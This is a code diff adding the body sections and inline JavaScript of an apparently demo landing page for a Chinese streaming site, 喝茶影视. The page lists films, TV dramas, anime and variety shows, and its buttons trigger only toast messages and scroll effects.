+          <div class="film-cover-icon">🕯️</div>
+          <span class="film-cover-badge hot">HOT</span>
+          <span class="film-cover-score">8.9</span>
+        </div>
+        <div class="film-body">
+          <h3>暗夜迷局 <span>2026</span></h3>
+          <div class="film-genre"><span>悬疑</span><span>犯罪</span></div>
+        </div>
+      </article>
+      <article class="film-card">
+        <div class="film-cover" style="min-height:280px">
+          <div class="film-cover-icon">🏔️</div>
+          <span class="film-cover-badge new">NEW</span>
+          <span class="film-cover-score">8.6</span>
+        </div>
+        <div class="film-body">
+          <h3>极地之光 <span>2026</span></h3>
+          <div class="film-genre"><span>冒险</span><span>灾难</span></div>
+        </div>
+      </article>
+      <article class="film-card">
+        <div class="film-cover" style="min-height:240px">
+          <div class="film-cover-icon">🤖</div>
+          <span class="film-cover-score">8.5</span>
+        </div>
+        <div class="film-body">
+          <h3>机械之心 <span>2025</span></h3>
+          <div class="film-genre"><span>科幻</span><span>剧情</span></div>
+        </div>
+      </article>
+      <article class="film-card">
+        <div class="film-cover" style="min-height:220px">
+          <div class="film-cover-icon">😂</div>
+          <span class="film-cover-badge hot">HOT</span>
+          <span class="film-cover-score">8.8</span>
+        </div>
+        <div class="film-body">
+          <h3>欢乐一家亲 <span>2026</span></h3>
+          <div class="film-genre"><span>喜剧</span><span>家庭</span></div>
+        </div>
+      </article>
+      <article class="film-card">
+        <div class="film-cover" style="min-height:260px">
+          <div class="film-cover-icon">🎭</div>
+          <span class="film-cover-badge new">NEW</span>
+          <span class="film-cover-score">9.1</span>
+        </div>
+        <div class="film-body">
+          <h3>戏梦人生 <span>2025</span></h3>
+          <div class="film-genre"><span>文艺</span><span>传记</span></div>
+        </div>
+      </article>
+    </div>
+  </div>
+</section>
+
+<!-- Drama Section -->
+<section class="section drama-section" id="drama">
+  <div class="section-inner">
+    <div class="sec-head">
+      <span class="sec-kicker">DRAMA</span>
+      <h2 class="sec-title">热播<em>电视剧</em></h2>
+      <p class="sec-desc">全网热门剧集同步更新，追剧不等待</p>
+    </div>
+    <div class="drama-tabs">
+      <button class="drama-tab active">古装权谋</button>
+      <button class="drama-tab">都市情感</button>
+      <button class="drama-tab">悬疑犯罪</button>
+      <button class="drama-tab">青春励志</button>
+    </div>
+    <div class="drama-list">
+      <div class="drama-row">
+        <div class="drama-rank">1</div>
+        <div class="drama-info">
+          <h4>大明风华录</h4>
+          <p>明朝宫廷权谋大剧 · 全48集</p>
+        </div>
+        <span class="drama-status end">已完结</span>
+        <span class="drama-ep">48集</span>
+        <a href="#" class="drama-play" aria-label="播放">▶</a>
+      </div>
+      <div class="drama-row">
+        <div class="drama-rank">2</div>
+        <div class="drama-info">
+          <h4>都市男女的24小时</h4>
+          <p>现代都市职场爱情 · 更新至32集</p>
+        </div>
+        <span class="drama-status">更新中</span>
+        <span class="drama-ep">32/40集</span>
+        <a href="#" class="drama-play" aria-label="播放">▶</a>
+      </div>
+      <div class="drama-row">
+        <div class="drama-rank">3</div>
+        <div class="drama-info">
+          <h4>沉默的证据</h4>
+          <p>硬核刑侦悬疑剧 · 全36集</p>
+        </div>
+        <span class="drama-status end">已完结</span>
+        <span class="drama-ep">36集</span>
+        <a href="#" class="drama-play" aria-label="播放">▶</a>
+      </div>
+      <div class="drama-row">
+        <div class="drama-rank">4</div>
+        <div class="drama-info">
+          <h4>山河月明</h4>
+          <p>历史正剧 · 全50集 · 豆瓣9.2</p>
+        </div>
+        <span class="drama-status end">已完结</span>
+        <span class="drama-ep">50集</span>
+        <a href="#" class="drama-play" aria-label="播放">▶</a>
+      </div>
+      <div class="drama-row">
+        <div class="drama-rank">5</div>
+        <div class="drama-info">
+          <h4>青春方程式</h4>
+          <p>校园青春励志 · 更新至18集</p>
+        </div>
+        <span class="drama-status">更新中</span>
+        <span class="drama-ep">18/24集</span>
+        <a href="#" class="drama-play" aria-label="播放">▶</a>
+      </div>
+      <div class="drama-row">
+        <div class="drama-rank">6</div>
+        <div class="drama-info">
+          <h4>天启：九州风云</h4>
+          <p>东方奇幻巨制 · 更新至28集</p>
+        </div>
+        <span class="drama-status">更新中</span>
+        <span class="drama-ep">28/45集</span>
+        <a href="#" class="drama-play" aria-label="播放">▶</a>
+      </div>
+      <div class="drama-row">
+        <div class="drama-rank">7</div>
+        <div class="drama-info">
+          <h4>归途</h4>
+          <p>家庭伦理温情剧 · 全30集</p>
+        </div>
+        <span class="drama-status end">已完结</span>
+        <span class="drama-ep">30集</span>
+        <a href="#" class="drama-play" aria-label="播放">▶</a>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- Anime Section -->
+<section class="section anime-section" id="anime">
+  <div class="section-inner">
+    <div class="sec-head">
+      <span class="sec-kicker">ANIME</span>
+      <h2 class="sec-title">精彩<em>动漫</em></h2>
+      <p class="sec-desc">国漫日漫一网打尽，新番同步追更</p>
+    </div>
+    <div class="anime-carousel-wrap">
+      <div class="anime-carousel">
+        <div class="anime-card">
+          <div class="anime-cover" style="background:linear-gradient(145deg,#2e4a2e,#1a3a1a)">🔥</div>
+          <div class="anime-card-info">
+            <h3>万古第一神</h3>
+            <p>少年逆天改命，踏破苍穹。国漫年番持续更新。</p>
+            <div class="anime-progress"><div class="anime-progress-bar" style="width:75%"></div></div>
+            <span class="anime-ep-info">更新至 156 集</span>
+          </div>
+        </div>
+        <div class="anime-card">
+          <div class="anime-cover" style="background:linear-gradient(145deg,#3a2a5a,#2a1a4a)">⚡</div>
+          <div class="anime-card-info">
+            <h3>咒术回战</h3>
+            <p>虎杖悠仁的咒术师之路，热血战斗新篇章。</p>
+            <div class="anime-progress"><div class="anime-progress-bar" style="width:45%"></div></div>
+            <span class="anime-ep-info">更新至 24 集</span>
+          </div>
+        </div>
+        <div class="anime-card">
+          <div class="anime-cover" style="background:linear-gradient(145deg,#1a3a4a,#0d2a3a)">🌊</div>
+          <div class="anime-card-info">
+            <h3>斗罗大陆</h3>
+            <p>唐三的魂师传奇，年番长篇持续更新。</p>
+            <div class="anime-progress"><div class="anime-progress-bar" style="width:90%"></div></div>
+            <span class="anime-ep-info">更新至 320 集</span>
+          </div>
+        </div>
+        <div class="anime-card">
+          <div class="anime-cover" style="background:linear-gradient(145deg,#4a3a1a,#3a2a0a)">🗡️</div>
+          <div class="anime-card-info">
+            <h3>雪中悍刀行</h3>
+            <p>徐凤年的江湖路，国风武侠动画精品。</p>
+            <div class="anime-progress"><div class="anime-progress-bar" style="width:60%"></div></div>
+            <span class="anime-ep-info">更新至 72 集</span>
+          </div>
+        </div>
+        <div class="anime-card">
+          <div class="anime-cover" style="background:linear-gradient(145deg,#3a1a2a,#2a0a1a)">🌸</div>
+          <div class="anime-card-info">
+            <h3>间谍过家家</h3>
+            <p>黄昏一家温馨爆笑日常，治愈系神作。</p>
+            <div class="anime-progress"><div class="anime-progress-bar" style="width:100%"></div></div>
+            <span class="anime-ep-info">全 37 集 · 完结</span>
+          </div>
+        </div>
+        <div class="anime-card">
+          <div class="anime-cover" style="background:linear-gradient(145deg,#1a4a3a,#0a3a2a)">🌿</div>
+          <div class="anime-card-info">
+            <h3>牧神记</h3>
+            <p>秦牧的修行之旅，东方奇幻新经典。</p>
+            <div class="anime-progress"><div class="anime-progress-bar" style="width:35%"></div></div>
+            <span class="anime-ep-info">更新至 48 集</span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- Variety Section -->
+<section class="section variety-section" id="variety">
+  <div class="section-inner">
+    <div class="sec-head">
+      <span class="sec-kicker">VARIETY</span>
+      <h2 class="sec-title">热门<em>综艺</em></h2>
+      <p class="sec-desc">爆笑真人秀、音乐竞演、脱口秀，周末快乐不打烊</p>
+    </div>
+    <div class="variety-deck">
+      <div class="variety-card">
+        <div class="variety-card-cover" style="background:linear-gradient(145deg,#c9a961,#d4a574)">🏃</div>
+        <div class="variety-card-body">
+          <h3>奔跑吧·茶话特别季</h3>
+          <p>原班人马回归，全新户外竞技挑战赛，每期不同主题带来无限欢乐。</p>
+          <div class="variety-meta">
+            <span class="variety-day">📅 每周六 20:00</span>
+            <span class="variety-type">户外竞技</span>
+          </div>
+        </div>
+      </div>
+      <div class="variety-card">
+        <div class="variety-card-cover" style="background:linear-gradient(145deg,#4a7c59,#5a8c69)">🎤</div>
+        <div class="variety-card-body">
+          <h3>我们的歌2026</h3>
+          <p>实力歌手同台竞演，代际音乐碰撞。周深、邓紫棋等加盟，好音乐不停歇。</p>
+          <div class="variety-meta">
+            <span class="variety-day">📅 每周五 21:00</span>
+            <span class="variety-type">音乐竞演</span>
+          </div>
+        </div>
+      </div>
+      <div class="variety-card">
+        <div class="variety-card-cover" style="background:linear-gradient(145deg,#8b6914,#a0822c)">🏡</div>
+        <div class="variety-card-body">
+          <h3>向往的生活8</h3>
+          <p>蘑菇屋温馨回归，黄磊何炅带你感受田园慢生活。嘉宾空降惊喜不断。</p>
+          <div class="variety-meta">
+            <span class="variety-day">📅 每周日 22:00</span>
+            <span class="variety-type">慢综艺</span>
+          </div>
+        </div>
+      </div>
+      <div class="variety-card">
+        <div class="variety-card-cover" style="background:linear-gradient(145deg,#5d4037,#7b5a4a)">🧩</div>
+        <div class="variety-card-body">
+          <h3>密室大逃脱7</h3>
+          <p>实景解密真人秀巅峰之作，超高难度密室挑战，烧脑解谜心跳加速。</p>
+          <div class="variety-meta">
+            <span class="variety-day">📅 每周三 20:00</span>
+            <span class="variety-type">烧脑推理</span>
+          </div>
+        </div>
+      </div>
+      <div class="variety-card">
+        <div class="variety-card-cover" style="background:linear-gradient(145deg,#6b8c42,#8baa5a)">🎙️</div>
+        <div class="variety-card-body">
+          <h3>吐槽大会·特别版</h3>
+          <p>明星互相吐槽爆梗不断，李诞主持，每一期都是笑点密集的欢乐时光。</p>
+          <div class="variety-meta">
+            <span class="variety-day">📅 每周四 22:00</span>
+            <span class="variety-type">喜剧脱口秀</span>
+          </div>
+        </div>
+      </div>
+      <div class="variety-card">
+        <div class="variety-card-cover" style="background:linear-gradient(145deg,#a0825a,#b89a6a)">🍳</div>
+        <div class="variety-card-body">
+          <h3>中餐厅9</h3>
+          <p>明星合伙人在海外经营中餐厅，美食与文化的完美融合，色香味俱全。</p>
+          <div class="variety-meta">
+            <span class="variety-day">📅 每周五 22:00</span>
+            <span class="variety-type">美食真人秀</span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- Features Section -->
+<section class="section features-section" id="features">
+  <div class="section-inner">
+    <div class="sec-head">
+      <span class="sec-kicker">WHY CHOOSE US</span>
+      <h2 class="sec-title">为什么选择<em>喝茶影视</em></h2>
+      <p class="sec-desc">六道工序，只为给你最好的观影体验</p>
+    </div>
+    <div class="tea-process">
+      <div class="tea-step">
+        <div class="tea-step-icon">🍃</div>
+        <h4>精选资源</h4>
+        <p>海量正版影视资源，院线大片同步更新</p>
+      </div>
+      <div class="tea-step">
+        <div class="tea-step-icon">⚡</div>
+        <h4>极速播放</h4>
+        <p>P2P加速技术，秒开无缓冲</p>
+      </div>
+      <div class="tea-step">
+        <div class="tea-step-icon">📱</div>
+        <h4>多端同步</h4>
+        <p>手机电脑电视全平台，一个账号通看</p>
+      </div>
+      <div class="tea-step">
+        <div class="tea-step-icon">🛡️</div>
+        <h4>纯净安全</h4>
+        <p>无广告弹窗，HTTPS加密传输</p>
+      </div>
+      <div class="tea-step">
+        <div class="tea-step-icon">🎯</div>
+        <h4>智能推荐</h4>
+        <p>AI算法精准匹配你的观影口味</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- CTA Section -->
+<section class="cta-section" id="cta">
+  <div class="cta-inner">
+    <h2>泡一壶好茶<br>看一部<span>好片</span></h2>
+    <p>立即访问喝茶影视，海量高清影视资源免费畅看，无需下载打开即看。</p>
+    <div class="cta-search">
+      <input type="text" placeholder="搜索你想看的影视作品..." aria-label="搜索">
+      <button class="btn btn-tea" type="button">🔍 搜索</button>
+    </div>
+  </div>
+</section>
+
+<!-- Footer -->
+<footer class="footer">
+  <div class="footer-inner">
+    <div class="footer-grid">
+      <div class="footer-brand">
+        <a href="#" class="nav-brand"><span class="nav-brand-icon">🍵</span>喝茶影视</a>
+        <p>喝茶影视是国内领先的在线影视平台，致力于为用户提供海量高清影视资源，涵盖电影、电视剧、动漫、综艺全品类内容。品味影视如品茶，每一帧都值得回味。</p>
+      </div>
+      <div class="footer-col">
+        <h4>快速导航</h4>
+        <ul>
+          <li><a href="#home">首页</a></li>
+          <li><a href="#film">电影频道</a></li>
+          <li><a href="#drama">电视剧频道</a></li>
+          <li><a href="#anime">动漫频道</a></li>
+          <li><a href="#variety">综艺频道</a></li>
+        </ul>
+      </div>
+      <div class="footer-col">
+        <h4>热门分类</h4>
+        <ul>
+          <li><a href="#">动作片</a></li>
+          <li><a href="#">爱情片</a></li>
+          <li><a href="#">科幻片</a></li>
+          <li><a href="#">悬疑片</a></li>
+          <li><a href="#">喜剧片</a></li>
+        </ul>
+      </div>
+      <div class="footer-col">
+        <h4>关于我们</h4>
+        <ul>
+          <li><a href="#">网站简介</a></li>
+          <li><a href="#">联系方式</a></li>
+          <li><a href="#">合作洽谈</a></li>
+          <li><a href="#">用户协议</a></li>
+          <li><a href="#">隐私政策</a></li>
+        </ul>
+      </div>
+    </div>
+    <div class="footer-bottom">
+      <p>© 2026 喝茶影视 (hechayingshi-wap.github.io) 版权所有 | 本站仅供影视资讯分享，资源来自互联网收集</p>
+      <div class="footer-social">
+        <a href="#" aria-label="微信">💬</a>
+        <a href="#" aria-label="微博">📱</a>
+        <a href="#" aria-label="QQ">🐧</a>
+        <a href="#" aria-label="邮箱">📧</a>
+      </div>
+    </div>
+  </div>
+</footer>
+
+<!-- Toast -->
+<div class="toast" id="toast">功能演示中...</div>
+
+<script>
+(function(){
+  'use strict';
+
+  // Preloader
+  window.addEventListener('load', function() {
+    setTimeout(function() {
+      var pl = document.getElementById('preloader');
+      if (pl) pl.classList.add('hidden');
+    }, 800);
+  });
+
+  // Mobile nav
+  var navToggle = document.getElementById('navToggle');
+  var navLinks = document.getElementById('navLinks');
+  if (navToggle && navLinks) {
+    navToggle.addEventListener('click', function() {
+      navLinks.classList.toggle('open');
+      var spans = navToggle.querySelectorAll('span');
+      if (navLinks.classList.contains('open')) {
+        spans[0].style.transform = 'rotate(45deg) translate(5px,5px)';
+        spans[1].style.opacity = '0';
+        spans[2].style.transform = 'rotate(-45deg) translate(5px,-5px)';
+      } else {
+        spans[0].style.transform = '';
+        spans[1].style.opacity = '';
+        spans[2].style.transform = '';
+      }
+    });
+    navLinks.querySelectorAll('a').forEach(function(a) {
+      a.addEventListener('click', function() {
+        navLinks.classList.remove('open');
+        var spans = navToggle.querySelectorAll('span');
+        spans[0].style.transform = '';
+        spans[1].style.opacity = '';
+        spans[2].style.transform = '';
+      });
+    });
+  }
+
+  // Nav scroll
+  var nav = document.getElementById('nav');
+  window.addEventListener('scroll', function() {
+    if (window.pageYOffset > 80) {
+      nav.style.background = 'rgba(20,13,5,0.95)';
+      nav.style.boxShadow = '0 4px 30px rgba(0,0,0,0.4)';
+    } else {
+      nav.style.background = 'rgba(26,18,8,0.85)';
+      nav.style.boxShadow = 'none';
+    }
+  }, { passive: true });
+
+  // Film filter
+  var filterBtns = document.querySelectorAll('.film-filter button');
+  filterBtns.forEach(function(btn) {
+    btn.addEventListener('click', function() {
+      filterBtns.forEach(function(b) { b.classList.remove('active'); });
+      btn.classList.add('active');
+      showToast('已切换到「' + btn.textContent + '」分类');
+    });
+  });
+
+  // Drama tabs
+  var tabBtns = document.querySelectorAll('.drama-tab');
+  tabBtns.forEach(function(btn) {
+    btn.addEventListener('click', function() {
+      tabBtns.forEach(function(b) { b.classList.remove('active'); });
+      btn.classList.add('active');
+      showToast('加载「' + btn.textContent + '」分类剧集...');
+    });
+  });
+
+  // Scroll reveal
+  var revealEls = document.querySelectorAll('.film-card, .drama-row, .anime-card, .variety-card, .tea-step, .sec-head');
+  revealEls.forEach(function(el) { el.classList.add('reveal'); });
+  var io = new IntersectionObserver(function(entries) {
+    entries.forEach(function(entry) {
+      if (entry.isIntersecting) {
+        entry.target.classList.add('in');
+        io.unobserve(entry.target);
+      }
+    });
+  }, { threshold: 0.1, rootMargin: '0px 0px -40px 0px' });
+  revealEls.forEach(function(el) { io.observe(el); });
+
+  // Toast
+  var toast = document.getElementById('toast');
+  var toastTimer;
+  function showToast(msg) {
+    toast.textContent = msg;
+    toast.classList.add('show');
+    clearTimeout(toastTimer);
+    toastTimer = setTimeout(function() { toast.classList.remove('show'); }, 2200);
+  }
+
+  // Bind play actions
+  document.querySelectorAll('.film-card, .drama-play, .anime-card, .variety-card').forEach(function(el) {
+    el.addEventListener('click', function(e) {
+      if (el.classList.contains('drama-play')) e.preventDefault();
+      showToast('🍵 正在为您跳转播放页面...');
+    });
+  });
+
+  // Search
+  var searchInput = document.querySelector('.cta-search input');
+  var searchBtn = document.querySelector('.cta-search .btn');
+  function doSearch() {
+    var val = searchInput.value.trim();
+    if (val) showToast('🔍 正在搜索："' + val + '"');
+    else showToast('请输入搜索关键词');
+  }
+  if (searchBtn) searchBtn.addEventListener('click', doSearch);
+  if (searchInput) searchInput.addEventListener('keypress', function(e) {
+    if (e.key === 'Enter') doSearch();
+  });
+
+  // Smooth scroll
+  document.querySelectorAll('a[href^="#"]').forEach(function(a) {
+    a.addEventListener('click', function(e) {
+      var target = document.querySelector(this.getAttribute('href'));
+      if (target) {
+        e.preventDefault();
+        target.scrollIntoView({ behavior: 'smooth', block: 'start' });
+      }
+    });
+  });
+
+})();
+</script>
+
+</body>
+</html>
